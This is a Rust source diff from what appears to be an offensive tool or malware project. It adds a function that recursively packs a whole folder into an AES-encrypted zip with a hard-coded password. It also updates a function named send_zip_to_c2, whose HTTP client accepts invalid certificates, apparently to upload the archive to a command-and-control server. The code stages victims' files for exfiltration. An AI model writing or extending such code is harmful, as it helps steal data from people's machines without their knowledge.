@@ -8,6 +8,7 @@ use std::io::prelude::*;
 use std::io::Read;
 use std::path::Path;
 use tempfile::NamedTempFile;
+use walkdir::WalkDir;
 use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
 use zip::{AesMode, CompressionMethod};
@@ -122,7 +123,40 @@ pub async fn zip_file(filename: &Path) -> ZipResult<NamedTempFile> {
     Ok(tmp_archive)
 }
 
-pub async fn send_zip_to_c2(filepath: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub async fn zip_dir(folder_path: &Path) -> ZipResult<NamedTempFile> {
+    let mut tmp_archive = NamedTempFile::new()?;
+    {
+        let mut zip = zip::ZipWriter::new(&mut tmp_archive);
+
+        let options = SimpleFileOptions::default()
+            .compression_method(CompressionMethod::Deflated)
+            .with_aes_encryption(AesMode::Aes256, "password");
+
+        for entry in WalkDir::new(folder_path).into_iter().filter_map(Result::ok) {
+            let path = entry.path();
+            let relative_path = path.strip_prefix(folder_path).unwrap();
+
+            if path.is_dir() {
+                if !relative_path.as_os_str().is_empty() {
+                    zip.add_directory(relative_path.to_string_lossy(), options)?;
+                }
+            } else if path.is_file() {
+                let mut f = File::open(path)?;
+                let mut buffer = Vec::new();
+                f.read_to_end(&mut buffer)?;
+
+                zip.start_file(relative_path.to_string_lossy(), options)?;
+                zip.write_all(&buffer)?;
+            }
+        }
+
+        zip.finish()?;
+    }
+
+    Ok(tmp_archive)
+}
+
+pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::Error>> {
     let client = Client::builder()
         .danger_accept_invalid_certs(true)
         .build()?;
